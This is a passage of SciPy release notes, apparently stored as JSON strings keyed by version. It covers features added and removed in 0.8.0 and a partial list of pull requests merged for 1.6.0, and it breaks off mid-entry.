`cho_solve_banded`, `circulant`, `companion`, `hadamard` and\n`leslie` were added to `scipy.linalg`.\n\nThe function `block_diag` was enhanced to accept scalar and 1D arguments,\nalong with the usual 2D arguments.\n\nNew function and changes in scipy.optimize\n------------------------------------------\n\nThe `curve_fit` function has been added; it takes a function and uses\nnon-linear least squares to fit that to the provided data.\n\nThe `leastsq` and `fsolve` functions now return an array of size one instead of\na scalar when solving for a single parameter.\n\nNew sparse least squares solver\n-------------------------------\n\nThe `lsqr` function was added to `scipy.sparse`.  `This routine\n<https://web.stanford.edu/group/SOL/software/lsqr/>`_ finds a\nleast-squares solution to a large, sparse, linear system of equations.\n\nARPACK-based sparse SVD\n-----------------------\n\nA naive implementation of SVD for sparse matrices is available in\nscipy.sparse.linalg._eigen.arpack. It is based on using an symmetric solver on\n<A, A>, and as such may not be very precise.\n\nAlternative behavior available for `scipy.constants.find`\n---------------------------------------------------------\n\nThe keyword argument `disp` was added to the function `scipy.constants.find`,\nwith the default value `True`.  When `disp` is `True`, the behavior is the\nsame as in Scipy version 0.7.  When `False`, the function returns the list of\nkeys instead of printing them.  (In SciPy version 0.9, the default will be\nreversed.)\n\nIncomplete sparse LU decompositions\n-----------------------------------\n\nScipy now wraps SuperLU version 4.0, which supports incomplete sparse LU\ndecompositions. These can be accessed via `scipy.sparse.linalg.spilu`.\nUpgrade to SuperLU 4.0 also fixes some known bugs.\n\nFaster matlab file reader and default behavior change\n------------------------------------------------------\n\nWe've rewritten the matlab file reader in Cython and it should now read\nmatlab files at around the same speed that Matlab does.\n\nThe reader reads matlab named and anonymous functions, but it can't\nwrite them.\n\nUntil scipy 0.8.0 we have returned arrays of matlab structs as numpy\nobject arrays, where the objects have attributes named for the struct\nfields.  As of 0.8.0, we return matlab structs as numpy structured\narrays.  You can get the older behavior by using the optional\n``struct_as_record=False`` keyword argument to `scipy.io.loadmat` and\nfriends.\n\nThere is an inconsistency in the matlab file writer, in that it writes\nnumpy 1D arrays as column vectors in matlab 5 files, and row vectors in\nmatlab 4 files.  We will change this in the next version, so both write\nrow vectors.  There is a `FutureWarning` when calling the writer to warn\nof this change; for now we suggest using the ``oned_as='row'`` keyword\nargument to `scipy.io.savemat` and friends.\n\nFaster evaluation of orthogonal polynomials\n-------------------------------------------\n\nValues of orthogonal polynomials can be evaluated with new vectorized functions\nin `scipy.special`: `eval_legendre`, `eval_chebyt`, `eval_chebyu`,\n`eval_chebyc`, `eval_chebys`, `eval_jacobi`, `eval_laguerre`,\n`eval_genlaguerre`, `eval_hermite`, `eval_hermitenorm`,\n`eval_gegenbauer`, `eval_sh_legendre`, `eval_sh_chebyt`,\n`eval_sh_chebyu`, `eval_sh_jacobi`. This is faster than constructing the\nfull coefficient representation of the polynomials, which was previously the\nonly available way.\n\nNote that the previous orthogonal polynomial routines will now also invoke this\nfeature, when possible.\n\nLambert W function\n------------------\n\n`scipy.special.lambertw` can now be used for evaluating the Lambert W\nfunction.\n\nImproved hypergeometric 2F1 function\n------------------------------------\n\nImplementation of `scipy.special.hyp2f1` for real parameters was revised.\nThe new version should produce accurate values for all real parameters.\n\nMore flexible interface for Radial basis function interpolation\n---------------------------------------------------------------\n\nThe `scipy.interpolate.Rbf` class now accepts a callable as input for the\n\"function\" argument, in addition to the built-in radial basis functions which\ncan be selected with a string argument.\n\nRemoved features\n================\n\nscipy.stsci: the package was removed\n\nThe module `scipy.misc.limits` was removed.\n\nscipy.io\n--------\n\nThe IO code in both NumPy and SciPy is being extensively\nreworked. NumPy will be where basic code for reading and writing NumPy\narrays is located, while SciPy will house file readers and writers for\nvarious data formats (data, audio, video, images, matlab, etc.).\n\nSeveral functions in `scipy.io` are removed in the 0.8.0 release including:\n`npfile`, `save`, `load`, `create_module`, `create_shelf`,\n`objload`, `objsave`, `fopen`, `read_array`, `write_array`,\n`fread`, `fwrite`, `bswap`, `packbits`, `unpackbits`, and\n`convert_objectarray`.  Some of these functions have been replaced by NumPy's\nraw reading and writing capabilities, memory-mapping capabilities, or array\nmethods.  Others have been moved from SciPy to NumPy, since basic array reading\nand writing capability is now handled by NumPy.\n\n\n==========================\n", "1.6.0": "-----------------------\n\n* `8032 <https://github.com/scipy/scipy/pull/8032>`__: ENH: Add in taylor window common in Radar processing\n* `8779 <https://github.com/scipy/scipy/pull/8779>`__: CI: Run benchmarks\n* `9361 <https://github.com/scipy/scipy/pull/9361>`__: ENH: Add Kendall's tau-a and tau-c variants to scipy.stats.kendalltau()\n* `11068 <https://github.com/scipy/scipy/pull/11068>`__: ENH: Adds correlation_lags function to scipy.signal\n* `11119 <https://github.com/scipy/scipy/pull/11119>`__: ENH: add Cramer-von-Mises (one-sample) test to scipy.stats\n* `11249 <https://github.com/scipy/scipy/pull/11249>`__: ENH: optimize: interpolative decomposition redundancy removal...\n* `11346 <https://github.com/scipy/scipy/pull/11346>`__: ENH: add fast toeplitz matrix multiplication using FFT\n* `11413 <https://github.com/scipy/scipy/pull/11413>`__: ENH: Multivariate t-distribution (stale)\n* `11563 <https://github.com/scipy/scipy/pull/11563>`__: ENH: exact p-value in stats.kendalltau() for sample sizes > 171\n* `11691 <https://github.com/scipy/scipy/pull/11691>`__: ENH: add a stack of reversal functions to linprog\n* `12043 <https://github.com/scipy/scipy/pull/12043>`__: ENH: optimize: add HiGHS methods to linprog - continued\n* `12061 <https://github.com/scipy/scipy/pull/12061>`__: Check parameter consistensy in signal.iirdesign\n* `12067 <https://github.com/scipy/scipy/pull/12067>`__: MAINT: Cleanup OLDAPI in ndimage/src/_ctest.c\n* `12069 <https://github.com/scipy/scipy/pull/12069>`__: DOC: Add developer guidelines for implementing the nan_policy...\n* `12077 <https://github.com/scipy/scipy/pull/12077>`__: MAINT: malloc return value checks for cython\n* `12080 <https://github.com/scipy/scipy/pull/12080>`__: MAINT: Remove suppress_warnings\n* `12085 <https://github.com/scipy/scipy/pull/12085>`__: ENH: special: support ILP64 Lapack\n* `12086 <https://github.com/scipy/scipy/pull/12086>`__: MAINT: Cleanup PyMODINIT_FUNC used during 2to3\n* `12097 <https://github.com/scipy/scipy/pull/12097>`__: ENH: stats: override stats.rayleigh.fit with analytical MLE\n* `12112 <https://github.com/scipy/scipy/pull/12112>`__: DOC: Improve integrate.nquad docstring\n* `12125 <https://github.com/scipy/scipy/pull/12125>`__: TST: Add a test for stats.gmean with negative input\n* `12139 <https://github.com/scipy/scipy/pull/12139>`__: TST: Reduce flakiness in lsmr test\n* `12142 <https://github.com/scipy/scipy/pull/12142>`__: DOC: add a note in poisson distribution when mu=0 and k=0 in...\n* `12144 <https://github.com/scipy/scipy/pull/12144>`__: DOC: Update ndimage.morphology.distance_transform\\*\n* `12154 <https://github.com/scipy/scipy/pull/12154>`__: ENH: scipy.signal: allow lists in gauss_spline\n* `12170 <https://github.com/scipy/scipy/pull/12170>`__: ENH: scipy.stats: add negative hypergeometric distribution\n* `12177 <https://github.com/scipy/scipy/pull/12177>`__: MAINT: Correctly add input line to ValueError\n* `12183 <https://github.com/scipy/scipy/pull/12183>`__: ENH: Use fromfile where possible\n* `12186 <https://github.com/scipy/scipy/pull/12186>`__: MAINT: generalize tests in SphericalVoronoi\n* `12198 <https://github.com/scipy/scipy/pull/12198>`__: TST: Fix str + bytes error\n* `12199 <https://github.com/scipy/scipy/pull/12199>`__: ENH: match np.result_type behaviour in some scipy.signal functions\n* `12200 <https://github.com/scipy/scipy/pull/12200>`__: ENH: add FIR and IIR gammatone filters to scipy.signal\n* `12204 <https://github.com/scipy/scipy/pull/12204>`__: ENH: Add overwrite argument for odr.ODR() and its test.\n* `12206 <https://github.com/scipy/scipy/pull/12206>`__: MAINT:lstsq: Switch to tranposed problem if the array is tall\n* `12208 <https://github.com/scipy/scipy/pull/12208>`__: wavfile bugfixes and maintenance\n* `12214 <https://github.com/scipy/scipy/pull/12214>`__: DOC: fix docstring of \"sd_beta\" of odr.Output.\n* `12234 <https://github.com/scipy/scipy/pull/12234>`__: MAINT: prevent divide by zero warnings in scipy.optimize BFGS...\n* `12235 <https://github.com/scipy/scipy/pull/12235>`__: REL: set version to 1.6.0.dev0\n* `12237 <https://github.com/scipy/scipy/pull/12237>`__: BUG: Fix exit condition for QUICK_SELECT pivot\n* `12242 <https://github.com/scipy/scipy/pull/12242>`__: ENH: Rename ndimage.sum to ndimage.sum_labels (keep sum as alias)\n* `12243 <https://github.com/scipy/scipy/pull/12243>`__: EHN: Update SuperLU\n* `12244 <https://github.com/scipy/scipy/pull/12244>`__: MAINT: stats: avoid spurious warnings in ncx2.pdf\n* `12245 <https://github.com/scipy/scipy/pull/12245>`__: DOC: Fixed incorrect default for mode in scipy.ndimage.spline_filter1d\n* `12248 <https://github.com/scipy/scipy/pull/12248>`__: MAINT: clean up pavement.py\n* `12250 <https://github.com/scipy/scipy/pull/12250>`__: ENH: Replaced csr_matrix() by tocsr() and complemented docstring\n* `12253 <https://github.com/scipy/scipy/pull/12253>`__: TST, CI: turn on codecov patch diffs\n* `12259 <https://github.com/scipy/scipy/pull/12259>`__: MAINT: Remove duplicated test for import cycles\n* `12263 <https://github.com/scipy/scipy/pull/12263>`__: ENH: Rename LocalSearchWrapper bounds\n* `12265 <https://github.com/scipy/scipy/pull/12265>`__: BUG optimize: Accept np.matrix in lsq_linear\n* `12266 <https://github.com/scipy/scipy/pull/12266>`__: BUG: Fix paren error in dual annealing accept_reject calculation\n* `12269 <https://github.com/scipy/scipy/pull/12269>`__: MAINT: Included mismatched shapes in error messages.\n* `12279 <https://github.com/scipy/scipy/pull/12279>`__: MAINT: \\`__array__\\` and array protocols cannot be used in sparse.\n* `12281 <https://github.com/scipy/scipy/pull/12281>`__: DOC: update wheel DL docs\n* `12283 <https://github.com/scipy/scipy/pull/12283>`__: ENH: odr: ILP64 Blas support in ODR\n* `12284 <https://github.com/scipy/scipy/pull/12284>`__: ENH: linalg: support for ILP64 BLAS/LAPACK in f2py wrappers\n* `12286 <https://github.com/scipy/scipy/pull/12286>`__: ENH: Cythonize scipy.spatial.transform.Rotation\n* `12287 <https://github.com/scipy/scipy/pull/12287>`__: ENH: Read arbitrary bit depth (including 24-bit) WAVs\n* `12292 <https://github.com/scipy/scipy/pull/12292>`__: BLD: fix musl compilation\n* `12293 <https://github.com/scipy/scipy/pull/12293>`__: MAINT: Fix a DeprecationWarning in validate_runtests_log.py.\n* `12296 <https://github.com/scipy/scipy/pull/12296>`__: DOC: Clarify area/volume in scipy.spatial.ConvexHull docstrings\n* `12302 <https://github.com/scipy/scipy/pull/12302>`__: CI: Run travis builds on master to keep cache up to date\n* `12305 <https://github.com/scipy/scipy/pull/12305>`__: TST: Cleanup print statements in tests\n* `12323 <https://github.com/scipy/scipy/pull/12323>`__: ENH: Add a Bunch-like class to use as a backwards compatible...\n* `12324 <https://github.com/scipy/scipy/pull/12324>`__: BUG: io: Fix an error that occurs when attempting to raise a...\n* `12327 <https://github.com/scipy/scipy/pull/12327>`__: DOC: clarify docstrings of \\`query_ball_tree\\` and \\`query_pairs\\`\n* `12334 <https://github.com/scipy/scipy/pull/12334>`__: PERF: Improve cKDTree.query_ball_point constant time cython overhead\n* `12338 <https://github.com/scipy/scipy/pull/12338>`__: DOC: improve consistency and clarity of docs in linalg and sparse/linalg\n* `12341 <https://github.com/scipy/scipy/pull/12341>`__: DOC: add Examples for KDTree query_ball_tree and query_pairs\n* `12343 <https://github.com/scipy/scipy/pull/12343>`__: DOC: add examples for special.eval_legendre()\n* `12349 <https://github.com/scipy/scipy/pull/12349>`__: BUG: avoid overflow in sum() for 32-bit systems\n* `12351 <https://github.com/scipy/scipy/pull/12351>`__: DOC: Fix example wavfile to be 16bit\n* `12352 <https://github.com/scipy/scipy/pull/12352>`__: [BUG] Consider 0/0 division in DOP853 error estimation\n* `12353 <https://github.com/scipy/scipy/pull/12353>`__: Fix exception causes in vq.py\n* `12354 <https://github.com/scipy/scipy/pull/12354>`__: MAINT: Cleanup unneeded void\\* cast in setlist.pxd\n* `12355 <https://github.com/scipy/scipy/pull/12355>`__: TST: Remove hack for old win-amd64 bug\n* `12356 <https://github.com/scipy/scipy/pull/12356>`__: ENH: Faster implementation of scipy.sparse.block_diag (#9411...\n* `12357 <https://github.com/scipy/scipy/pull/12357>`__: MAINT,TST: update and run scipy/special/utils/convert.py\n* `12358 <https://github.com/scipy/scipy/pull/12358>`__: TST: Check mstat.skewtest pvalue\n* `12359 <https://github.com/scipy/scipy/pull/12359>`__: TST: Sparse matrix test with int64 indptr and indices\n* `12363 <https://github.com/scipy/scipy/pull/12363>`__: DOC: ref. in CloughTocher2DInterpolator\n* `12364 <https://github.com/scipy/scipy/pull/12364>`__: DOC: \\`sparse_distance_matrix\\` and \\`count_neighbors\\` examples\n* `12371 <https://github.com/scipy/scipy/pull/12371>`__: MAINT, CI: bump to latest stable OpenBLAS\n* `12372 <https://github.com/scipy/scipy/pull/12372>`__: MAINT: Minor cleanup of (c)KDTree tests\n* `12374 <https://github.com/scipy/scipy/pull/12374>`__: DEP: Deprecate \\`distance.wminkowski\\`\n* `12375 <https://github.com/scipy/scipy/pull/12375>`__: ENH: Add fast path for minkowski distance with p=1,2 and support...\n* `12376 <https://github.com/scipy/scipy/pull/12376>`__: Fix exception causes in most of the codebase\n* `12377 <https://github.com/scipy/scipy/pull/12377>`__: DOC: Quick fix - adds newline to correlation_lags docstring Examples...\n* `12381 <https://github.com/scipy/scipy/pull/12381>`__: BENCH: remove obsolete goal_time param\n* `12382 <https://github.com/scipy/scipy/pull/12382>`__: ENH: Replace KDTree with a thin wrapper over cKDTree\n* `12385 <https://github.com/scipy/scipy/pull/12385>`__: DOC: improve docstrings of interpolate.NearestNDInterpolator.__call__...\n* `12387 <https://github.com/scipy/scipy/pull/12387>`__: DOC/STY: add example to scipy.signal.correlate\n* `12393 <https://github.com/scipy/scipy/pull/12393>`__: CI: Replace the existing check for non-ASCII characters with...\n* `12394 <https://github.com/scipy/scipy/pull/12394>`__: CI: arm64 numpy now available\n* `12395 <https://github.com/scipy/scipy/pull/12395>`__: ENH: improve stats.binned_statistic_dd performance\n* `12396 <https://github.com/scipy/scipy/pull/12396>`__: DOC, MAINT: forward port 1.5.0 relnotes\n* `12398 <https://github.com/scipy/scipy/pull/12398>`__: API: Disable len() and indexing of Rotation instances with single...\n* `12399 <https://github.com/scipy/scipy/pull/12399>`__: MAINT: Replace some Unicode dash-like chars with an ASCII hyphen.\n* `12402 <https://github.com/scipy/scipy/pull/12402>`__: update .mailmap\n* `12404 <https://github.com/scipy/scipy/pull/12404>`__: MAINT: io: Change the encoding comment of test_mio.py to utf-8.\n* `12416 <https://github.com/scipy/scipy/pull/12416>`__: CI: cache mingw, azure pipelines\n* `12427 <https://github.com/scipy/scipy/pull/12427>`__: BUG: logic error in loop unrolling (cKDTree)\n* `12432 <https://github.com/scipy/scipy/pull/12432>`__: DOC: Remove the \"Basic functions\" section from the SciPy tutorial.\n* `12434 <https://github.com/scipy/scipy/pull/12434>`__: ENH:linalg: Add LAPACK wrappers pptrf/pptrs/ppsv/pptri/ppcon\n* `12435 <https://github.com/scipy/scipy/pull/12435>`__: DOC: fix simplex math for scipy.stats.dirichlet documentation\n* `12439 <https://github.com/scipy/scipy/pull/12439>`__: DOC: add API methods summary for NdPPoly\n* `12443 <https://github.com/scipy/scipy/pull/12443>`__: BUG: stats: Improve calculation of exponnorm.pdf\n* `12448 <https://github.com/scipy/scipy/pull/12448>`__: DOC: stats: Add \"Examples\" to the ansari docstring.\n* `12450 <https://github.com/scipy/scipy/pull/12450>`__: ENH: add \\`leaves_color_list\\` for cluster.dendrogram dictionary.\n* `12451 <https://github.com/scipy/scipy/pull/12451>`__: MAINT: remove \"blacklist\" terminology from code base\n* `12452 <https://github.com/scipy/scipy/pull/12452>`__: DOC: clarify the meaning of whitening for cluster.vq.whiten()\n* `12455 <https://github.com/scipy/scipy/pull/12455>`__: MAINT: clearer error message in setup.py\n* `12457 <https://github.com/scipy/scipy/pull/12457>`__: ENH: stats: override stats.pareto.fit with analytical MLE\n* `12460 <https://github.com/scipy/scipy/pull/12460>`__: check if column in spearman rho is entirely NaN or Inf\n* `12463 <https://github.com/scipy/scipy/pull/12463>`__: DOC: improve and clean up \\*Spline docstrings in fitpack2.py\n* `12474 <https://github.com/scipy/scipy/pull/12474>`__: ENH: linalg: speedup _sqrtm_triu by moving tight loop to Cython\n* `12476 <https://github.com/scipy/scipy/pull/12476>`__: ENH: add IIR comb filter to scipy.signal\n* `12484 <https://github.com/scipy/scipy/pull/12484>`__: Fix documentation for minimize\n* `12486 <https://github.com/scipy/scipy/pull/12486>`__: DOC: add a note in poisson distribution when mu=0 and k=0 in...\n* `12491 <https://github.com/scipy/scipy/pull/12491>`__: MAINT: forward port 1.5.1 release notes\n* `12508 <https://github.com/scipy/scipy/pull/12508>`__: Fix exception causes all over the codebase\n* `12514 <https://github.com/scipy/scipy/pull/12514>`__: ENH: stats: override stats.invgauss.fit with analytical MLE\n* `12519 <https://github.com/scipy/scipy/pull/12519>`__: PERF: Avoid np.zeros when custom initialization is needed anyway\n* `12520 <https://github.com/scipy/scipy/pull/12520>`__: DOC: Minor RST section renaming.\n* `12521 <https://github.com/scipy/scipy/pull/12521>`__: MAINT: Remove unused imports\n* `12522 <https://github.com/scipy/scipy/pull/12522>`__: PERF: Get rid of unnececssary allocation in VarReader5.cread_fieldnames\n* `12524 <https://github.com/scipy/scipy/pull/12524>`__: DOC: special: Set Axes3D rect to avoid clipping labels in plot.\n* `12525 <https://github.com/scipy/scipy/pull/12525>`__: Fix large sparse nnz\n* `12526 <https://github.com/scipy/scipy/pull/12526>`__: DOC: Remove double section and too long header underline.\n* `12527 <https://github.com/scipy/scipy/pull/12527>`__: Improve error message for wrong interpolation type\n* `12530 <https://github.com/scipy/scipy/pull/12530>`__: Move redundant logic outside loop for conditional speedup in...\n* `12532 <https://github.com/scipy/scipy/pull/12532>`__: ENH: Add norm={\"forward\", \"backward\"} to \\`scipy.fft\\`\n* `12535 <https://github.com/scipy/scipy/pull/12535>`__: MAINT: Avoid sphinx deprecated aliases for SeeAlso and Only\n* `12540 <https://github.com/scipy/scipy/pull/12540>`__: BUG: fix odr.output.work_ind key bug and add its test.\n* `12541 <https://github.com/scipy/scipy/pull/12541>`__: ENH: add solver for minimum weight full bipartite matching\n* `12550 <https://github.com/scipy/scipy/pull/12550>`__: PERF: pickling speed of rv\\*\n* `12551 <https://github.com/scipy/scipy/pull/12551>`__: DOC: fix typo in cluster/_hierarchy.pyx\n* `12552 <https://github.com/scipy/scipy/pull/12552>`__: CI: Cleanup travis pip installs\n* `12556 <https://github.com/scipy/scipy/pull/12556>`__: BUG: Fix problem with Scipy.integrate.solve_bvp for big problems\n* `12557 <https://github.com/scipy/scipy/pull/12557>`__: MAINT: Use extern templates to improve sparsetools compile time\n* `12558 <https://github.com/scipy/scipy/pull/12558>`__: MAINT: Remove hack to allow scipy.fft to act like a function\n* `12563 <https://github.com/scipy/scipy/pull/12563>`__: MAINT: Remove unused mu0 in special/orthogonal.py\n* `12564 <https://github.com/scipy/scipy/pull/12564>`__: DOC: fix return type docstring for least_squares\n* `12565 <https://github.com/scipy/scipy/pull/12565>`__: DOC: stats: respond to query about Kruskal-Wallis test being...\n* `12566 <https://github.com/scipy/scipy/pull/12566>`__: BUG: Interpolate: use stable sort\n* `12568 <https://github.com/scipy/scipy/pull/12568>`__: Updated documentation for as_quat\n* `12571 <https://github.com/scipy/scipy/pull/12571>`__: DEP: remove deprecated slepian window\n* `12573 <https://github.com/scipy/scipy/pull/12573>`__: DEP: remove \\`frechet_l\\` and \\`frechet_r\\`\n* `12575 <https://github.com/scipy/scipy/pull/12575>`__: BUG: stats: fix multinomial.pmf NaNs when params sum > 1\n* `12576 <https://github.com/scipy/scipy/pull/12576>`__: MAINT: remove warning from LSQSphereBivariateSpline\n* `12582 <https://github.com/scipy/scipy/pull/12582>`__: ENH: Multivariate t-distribution\n* `12587 <https://github.com/scipy/scipy/pull/12587>`__: ENH: speed up rvs of gengamma in scipy.stats\n* `12588 <https://github.com/scipy/scipy/pull/12588>`__: DOC: add Examples add see also sections for LinearNDInterpolator,...\n* `12597 <https://github.com/scipy/scipy/pull/12597>`__: ENH: Add single-sided p-values to t-tests\n* `12599 <https://github.com/scipy/scipy/pull/12599>`__: Small update to scipy FFT tutorial\n* `12600 <https://github.com/scipy/scipy/pull/12600>`__: ENH: disjoint set data structure\n* `12602 <https://github.com/scipy/scipy/pull/12602>`__: BUG: add const for Read-only views in interpnd.pyx\n* `12605 <https://github.com/scipy/scipy/pull/12605>`__: BUG: correct \\`np.asanyarray\\` use in \\`scipy.constants.lambda2nu\\`\n* `12610 <https://github.com/scipy/scipy/pull/12610>`__: MAINT: forward port 1.5.2 release notes\n* `12612 <https://github.com/scipy/scipy/pull/12612>`__: MAINT: stats: Use explicit keyword parameters instead of \\`\\*\\*kwds\\`.\n* `12616 <https://github.com/scipy/scipy/pull/12616>`__: DOC: make explicit docstring that interpolate.interp1d only accepts...\n* `12618 <https://github.com/scipy/scipy/pull/12618>`__: DOC: Minor doc formatting.\n* `12640 <https://github.com/scipy/scipy/pull/12640>`__: MAINT: stats: fix issues with scipy.stats.pearson3 docs, moment,...\n* `12647 <https://github.com/scipy/scipy/pull/12647>`__: TST: Add Boost ellipr[cdfgj]_data test data\n* `12648 <https://github.com/scipy/scipy/pull/12648>`__: DOC: Update special/utils/README with instructions\n* `12649 <https://github.com/scipy/scipy/pull/12649>`__: DOC: simplified pip quickstart guide\n* `12650 <https://github.com/scipy/scipy/pull/12650>`__: DOC: stats: Fix boxcox docstring: lambda can be negative.\n* `12655 <https://github.com/scipy/scipy/pull/12655>`__: DOC: update Steering Council members listed in governance docs\n* `12659 <https://github.com/scipy/scipy/pull/12659>`__: rv_sample expect bug\n* `12663 <https://github.com/scipy/scipy/pull/12663>`__: DOC: optimize: try to fix linprog method-specific documentation\n* `12664 <https://github.com/scipy/scipy/pull/12664>`__: BUG: stats: Fix logpdf with large negative values for logistic...\n* `12666 <https://github.com/scipy/scipy/pull/12666>`__: MAINT: Fixes from static analysis\n* `12667 <https://github.com/scipy/scipy/pull/12667>`__: ENH: Adding Modified Rodrigues Parameters to the Rotation class\n* `12670 <https://github.com/scipy/scipy/pull/12670>`__: DOC: Update documentation for Gamma distribution\n* `12673 <https://github.com/scipy/scipy/pull/12673>`__: API: Unconditionally return np.intp from cKDTree.query\n* `12677 <https://github.com/scipy/scipy/pull/12677>`__: MAINT: Add Autogenerated notice to ufuncs.pyi\n* `12682 <https://github.com/scipy/scipy/pull/12682>`__: MAINT: Remove _util._valarray\n* `12688 <https://github.com/scipy/scipy/pull/12688>`__: MAINT: add f2py-generated scipy.integrate files to .gitignore\n* `12689 <https://github.com/scipy/scipy/pull/12689>`__: BENCH: simplify benchmark setup, remove benchmarks/run.py\n* `12694 <https://github.com/scipy/scipy/pull/12694>`__: scipy/stats: Add laplace_asymmetric continuous distribution\n* `12695 <https://github.com/scipy/scipy/pull/12695>`__: DOC: update Ubuntu quickstart; conda compilers now work!\n* `12698 <https://github.com/scipy/scipy/pull/12698>`__: MAINT: Replace np.max with np.maximum\n* `12700 <https://github.com/scipy/scipy/pull/12700>`__: TST: bump test precision for constrained trustregion test\n* `12702 <https://github.com/scipy/scipy/pull/12702>`__: TST: bump test tolerance for \\`DifferentialEvolutionSolver.test_L4\\`\n* `12703 <https://github.com/scipy/scipy/pull/12703>`__: BUG: Improve input validation for sepfir2d\n* `12708 <https://github.com/scipy/scipy/pull/12708>`__: MAINT: fix a typo in scipy.sparse\n* `12709 <https://github.com/scipy/scipy/pull/12709>`__: BUG: bvls can fail catastrophically to converge\n* `12711 <https://github.com/scipy/scipy/pull/12711>`__: MAINT: Use platform.python_implementation to determine IS_PYPY\n* `12713 <https://github.com/scipy/scipy/pull/12713>`__: TST: Fix flaky test_lgmres\n* `12716 <https://github.com/scipy/scipy/pull/12716>`__: DOC: add examples and tutorial links for interpolate functions...\n* `12717 <https://github.com/scipy/scipy/pull/12717>`__: DOC: Fix Issue #5396\n* `12725 <https://github.com/scipy/scipy/pull/12725>`__: ENH: Support complex-valued images and kernels for many ndimage...\n* `12729 <https://github.com/scipy/scipy/pull/12729>`__: DEP: remove setup_requires\n* `12732 <https://github.com/scipy/scipy/pull/12732>`__: BENCH: skip benchmarks instead of hiding them when SCIPY_XSLOW=0\n* `12734 <https://github.com/scipy/scipy/pull/12734>`__: CI: Don't ignore line-length in the lint_diff check.\n* `12736 <https://github.com/scipy/scipy/pull/12736>`__: DOC: Fix signal.windows.get_window() 'exponential' docstring\n* `12737 <https://github.com/scipy/scipy/pull/12737>`__: ENH: stats: override stats.gumbel_r.fit and stats.gumbel_l.fit...\n* `12738 <https://github.com/scipy/scipy/pull/12738>`__: ENH: stats: override stats.logistic.fit with system of equations...\n* `12743 <https://github.com/scipy/scipy/pull/12743>`__: BUG: Avoid negative variances in circular statistics\n* `12744 <https://github.com/scipy/scipy/pull/12744>`__: Prevent build error on GNU/Hurd\n* `12746 <https://github.com/scipy/scipy/pull/12746>`__: TST: parameterize the test cases in test_ndimage.py\n* `12752 <https://github.com/scipy/scipy/pull/12752>`__: DOC: Add examples for some root finding functions.\n* `12754 <https://github.com/scipy/scipy/pull/12754>`__: MAINT, CI: Azure windows deps multiline\n* `12756 <https://github.com/scipy/scipy/pull/12756>`__: ENH: stats: Add an sf method to levy for improved precision in...\n* `12757 <https://github.com/scipy/scipy/pull/12757>`__: ENH: stats: Add an sf method to levy_l for improved precision.\n* `12765 <https://github.com/scipy/scipy/pull/12765>`__: TST, MAINT: infeasible_2 context\n* `12767 <https://github.com/scipy/scipy/pull/12767>`__: Fix spline interpolation boundary handling for modes reflect...\n* `12769 <https://github.com/scipy/scipy/pull/12769>`__: DOC: syntax error in scipy.interpolate.bspl\n* `12770 <https://github.com/scipy/scipy/pull/12770>`__: ENH: add nearest-up rounding to scipy.interpolate.interp1d\n* `12771 <https://github.com/scipy/scipy/pull/12771>`__: TST: fix invalid input unit test for scipy.signal.gammatone\n* `12775 <https://github.com/scipy/scipy/pull/12775>`__: ENH: Adds quadratic_assignment with two methods\n* `12776 <https://github.com/scipy/scipy/pull/12776>`__: ENH: add grid-constant boundary handling in ndimage interpolation...\n* `12777 <https://github.com/scipy/scipy/pull/12777>`__: Add Taylor Window function - Common in Radar DSP\n* `12779 <https://github.com/scipy/scipy/pull/12779>`__: ENH: Improvements to pocketfft thread pool and ARM neon vectorization\n* `12788 <https://github.com/scipy/scipy/pull/12788>`__: API: Rename cKDTree n_jobs argument to workers\n* `12792 <https://github.com/scipy/scipy/pull/12792>`__: DOC: remove THANKS.txt file in favor of scipy.org\n* `12793 <https://github.com/scipy/scipy/pull/12793>`__: Add new flag to authors tool\n* `12802 <https://github.com/scipy/scipy/pull/12802>`__: BENCH: add scipy.ndimage.interpolation benchmarks\n* `12803 <https://github.com/scipy/scipy/pull/12803>`__: Do not pin the version of numpy in unsupported python versions\n* `12810 <https://github.com/scipy/scipy/pull/12810>`__: CI: fix 32-bit Linux build failure on Azure CI runs\n* `12812 <https://github.com/scipy/scipy/pull/12812>`__: ENH: support interpolation of complex-valued images\n* `12814 <https://github.com/scipy/scipy/pull/12814>`__: BUG: nonlin_solve shouldn't pass non-vector dx to tol_norm\n* `12818 <https://github.com/scipy/scipy/pull/12818>`__: Update ckdtree.pyx\n* `12822 <https://github.com/scipy/scipy/pull/12822>`__: MAINT: simplify directed_hausdorff\n* `12827 <https://github.com/scipy/scipy/pull/12827>`__: DOC: Fix wrong name w being used instead of worN in docs.\n* `12831 <https://github.com/scipy/scipy/pull/12831>`__: DOC: fix typo in sparse/base.py\n* `12835 <https://github.com/scipy/scipy/pull/12835>`__: MAINT: stats: Improve vonmises PDF calculation.\n* `12839 <https://github.com/scipy/scipy/pull/12839>`__: ENH: scipy.stats: add multivariate hypergeometric distribution\n* `12843 <https://github.com/scipy/scipy/pull/12843>`__: changed M to N in windows.dpss\n* `12846 <https://github.com/scipy/scipy/pull/12846>`__: MAINT: update minimum NumPy version to 1.16.5\n* `12847 <https://github.com/scipy/scipy/pull/12847>`__: DOC: Unify the formula in docs of scipy.stats.pearsonr()\n* `12849 <https://github.com/scipy/scipy/pull/12849>`__: DOC: polish QAP docs for consistency and readability\n* `12852 <https://github.com/scipy/scipy/pull/12852>`__: ENH, MAINT: Bring KDTree interface to feature-parity with cKDTree\n* `12858 <https://github.com/scipy/scipy/pull/12858>`__: DOC: use :doi: and :arxiv: directives for references\n* `12872 <https://github.com/scipy/scipy/pull/12872>`__: lazily import multiprocessing.Pool in MapWrapper\n* `12878 <https://github.com/scipy/scipy/pull/12878>`__: DOC: document ScalarFunction\n* `12882 <https://github.com/scipy/scipy/pull/12882>`__: MAINT: stats: Change a test to use <= instead of strictly less...\n* `12885 <https://github.com/scipy/scipy/pull/12885>`__: numpy.linspace calls edited to ensure correct spacing.\n* `12886 <https://github.com/scipy/scipy/pull/12886>`__: DOC: stats: Add 'versionadded' to cramervonmises docstring.\n* `12899 <https://github.com/scipy/scipy/pull/12899>`__: TST: make a couple of tests expected to fail on 32-bit architectures\n* `12903 <https://github.com/scipy/scipy/pull/12903>`__: DOC: update Windows build guide and move into contributor guide\n* `12907 <https://github.com/scipy/scipy/pull/12907>`__: DOC: clarify which array the precenter option applies to\n* `12908 <https://github.com/scipy/scipy/pull/12908>`__: MAINT: spatial: Remove two occurrences of unused variables in...\n* `12909 <https://github.com/scipy/scipy/pull/12909>`__: ENH: stats: Add methods gumbel_r._sf and gumbel_r._isf\n* `12910 <https://github.com/scipy/scipy/pull/12910>`__: CI: travis: Remove some unnecessary code from .travis.yml.\n* `12911 <https://github.com/scipy/scipy/pull/12911>`__: Minor 